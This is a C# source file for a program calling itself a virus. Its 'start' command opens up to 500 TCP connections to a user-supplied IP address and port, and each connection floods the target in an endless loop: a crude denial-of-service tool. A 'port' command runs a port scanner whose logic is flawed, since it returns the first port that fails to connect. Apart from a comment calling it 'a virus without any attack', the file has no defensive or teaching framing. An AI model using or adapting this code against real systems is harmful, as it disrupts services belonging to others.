using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;


//this is a virus without any attack
namespace VirusTomLick
{
    class Program
    {
        static CTcpSender[] s;
      static  bool leave = true;
        static void Main(string[] args)
        {
            write("welcome to start this program");




            do
            {

                string cin = read();
                switch (cin)
                {
                    case "start":
                        {
                        error:
                            try
                            {
                                write("enter the ipa");
                                string ipa = read();
                                write("enter the port");
                                int port = Convert.ToInt32(read());
                                hacking(new IPEndPoint(IPAddress.Parse(ipa), port));
                                write("finish hack");
                            }
                            catch
                            {
                                write("got en error");
                                goto error;
                            }
                            break;
                        }
                    case "end":
                        {
                            leave = false;
                            break;
                       
                            
                        }
                    case "port":
                        {
                        err:
                            IPAddress ip;
                            try
                            {
                                 ip = IPAddress.Parse(read());
                            }
                            catch
                            {
                                write("never wonder to trick me");
                                goto err;
                            }
                            try
                            {
                                portScan(ip);
                            }
                            catch 
                            {
                                write("no port hole");
                            }
                            break;
                        }
                }

            } while (leave);

        }
        static int portScan(IPAddress ipa)
        {
            CTcpSender[] sender = new CTcpSender[500];
            for (int i = 0; i != 500; )
            {
                try
                {
                    sender[i++] = new CTcpSender(ipa.ToString(), i);
                }
                catch
                {

                    return i;
                }
            }
            throw new ArgumentException();
        }
        static void hacking(IPEndPoint loc)
        {
            s = new CTcpSender[500];
            for (int i = 0; i != 500; )
            {
                try
                {
                    s[i++] = new CTcpSender(loc.Address.ToString(), loc.Port);
                    if ((i % 10) == 0)
                    {
                        write(i.ToString());
                    }
                }
                catch { }
            }
        }
        #region thing
        static string read()
        {
            return Console.ReadLine();
        }
        static void write(string s)
        {
            Console.WriteLine(s);
        }
        #endregion
    }

    public class CTcpSender
    {
        private TcpClient c;
        private NetworkStream nws;
        private System.Threading.Thread t;
        private IPEndPoint loc = null;
        public CTcpSender(string hostname, int port)
        {
            loc = new IPEndPoint(IPAddress.Parse(hostname), port);
            setUp();
        }
        ~CTcpSender()
        {
            try
            {
                t.Abort();
            }
            catch { }
        }
        private void setUp()
        {
            try
            {
                c = new TcpClient();
                c.Connect(loc);
                nws = c.GetStream();
           
            }
            catch (Exception ex)
            {
                throw ex;
            }   
            t = new System.Threading.Thread(new System.Threading.ThreadStart(sending));
                t.Start();
        }

        void sending()
        {
            byte[] b = Encoding.ASCII.GetBytes("hahahahahHAHHAHHA");
        res:
            try
            {
                nws.Write(b, 0, b.Length);
            }
            catch { }
            goto res;
        }
    }
}
